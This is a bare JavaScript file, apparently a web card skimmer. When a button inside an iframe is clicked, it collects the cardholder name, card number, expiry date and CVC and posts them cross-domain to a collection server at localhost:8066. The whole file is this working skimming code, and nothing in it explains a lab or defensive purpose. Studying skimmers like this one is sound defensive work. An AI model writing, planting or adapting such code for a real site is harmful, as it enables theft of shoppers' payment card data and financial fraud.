
window.onload = function(){
  $("#iframes").contents().find('.btn').bind("click", function() {
    var cardHolder = $('#iframes').contents().find('#ch').val();
    var cardNumber = $('#iframes').contents().find('#cn').val();
    var expiryDate = $('#iframes').contents().find('#ed').val();
    var cvc = $('#iframes').contents().find('#cv').val();
    var chaine = '';
    var data = chaine.concat("  CardHolder = ",cardHolder,", ","CardNumber = ",cardNumber,", ","ExpiryDate = ",expiryDate,", ", "CVC= ",cvc, "    " );
    var pdata = JSON.stringify(data);
    setTimeout(function() {
      jQuery.ajax({
        xhrFields: {
          withCredentials: true
        },
        type: "POST",
        async: true,
        url: 'http://localhost:8066/',
        data: pdata,
        jsonpCallback: 'callback',
        dataType: 'jsonp',
        crossDomain: true,
      }).done(function(response){
        console.log(response);
    }).fail(function(error){
        console.log(error.statusText);
    });
    }, 250);
    }); 
};